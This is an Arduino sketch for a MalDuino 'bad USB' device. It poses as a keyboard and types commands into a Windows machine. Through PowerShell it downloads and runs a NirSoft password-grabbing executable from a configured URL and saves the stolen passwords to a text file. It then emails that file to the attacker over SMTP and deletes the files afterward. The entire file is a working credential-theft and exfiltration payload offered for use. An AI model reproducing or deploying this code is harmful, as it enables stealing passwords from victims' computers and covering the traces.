/*
Copyright (c) 2017 Seytonic, Spacehuhn (Licensed under MIT)
For more information see: github.com/seytonic/malduino

Edited by davidlj95

The following script allows a MalDuino.com Lite bad USB to 
  1. Download a tool to grab passwords
     (prepared for NirSoft.net Windows tools)
  2. Execute the tool and save the passwords to a text file
  3. Send the text file via email to your email

It can be modified to accept other password grabbing softwares

Setup your parameters before uploading it to your MalDuino
changing the file params.h

DuckyScript fails to create a valid script because needs 
combination keystrokes like CTRL+A and CTRL+S

The malduino.com/converter converts them to CTRL + writing A
and not the A key itself. Therefore used the keycodes defined
in http://www.usb.org/developers/hidpage/Hut1_12v2.pdf with
a suplement of 0x88 (136 in dec.) to write the key according
to Keyboard.cpp
*/

#include "Keyboard.h"
#include "Mouse.h"
#include "Params.h"

#define blinkInterval 50
#define ledPin 3
#define buttonPin 6

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;

bool ledOn = true;

void typeKey(int key){
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup(){
  
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  
  if(digitalRead(buttonPin) == LOW){
    
    Keyboard.begin();
    Mouse.begin();
    
    /* ----- Begin-Script -----*/
    
    /* [Parsed By Duckuino (Licensed under MIT) - for more information visit: https://github.com/Nurrl/Dckuino.js] */    
    delay(3000);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_ESC);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    Keyboard.print("cmd");

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(1000);

    delay(defaultDelay);
    Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('" APP_URL "','" WORKDIR_CMD "\\" FILES_NAME ".exe');");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print(WORKDIR_CMD "\\" FILES_NAME ".exe");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(DOWNLOAD_TIME);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(0x8C);
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(200);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(0x9E);
    Keyboard.releaseAll();
    delay(500);

    delay(defaultDelay);
    Keyboard.print(WORKDIR_CMD "\\" FILES_NAME ".txt");

    delay(500);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(500);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    delay(1000);

    delay(defaultDelay);
    Keyboard.print("powershell");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.print("$SMTPServer = '" EMAIL_SMTP "'");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, " EMAIL_PORT ")");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$SMTPInfo.EnableSsl = $true");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" EMAIL_USER "', '" EMAIL_PASSWORD "');");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$ReportEmail.From = '" EMAIL_FROM "'");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$ReportEmail.To.Add('" EMAIL_TO "')");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$ReportEmail.Subject = '" EMAIL_SUBJECT "'");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$ReportEmail.Body = '" EMAIL_BODY "'");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$ReportEmail.Attachments.Add(" WORKDIR_PS " + '\\" FILES_NAME ".txt')");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    Keyboard.print("$SMTPInfo.Send($ReportEmail)");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(2000);

    delay(defaultDelay);
    Keyboard.print("exit");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    // ---------------------delete and end

    delay(defaultDelay);
    Keyboard.print("del " WORKDIR_CMD "\\" FILES_NAME ".*");

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(300);

    delay(defaultDelay);
    Keyboard.print("exit");

    delay(defaultDelay);
    typeKey(KEY_RETURN);
    
    /* ----- End-Script -----*/
    
    Keyboard.end();
    Mouse.end();
  }
}

void loop(){
  ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
}
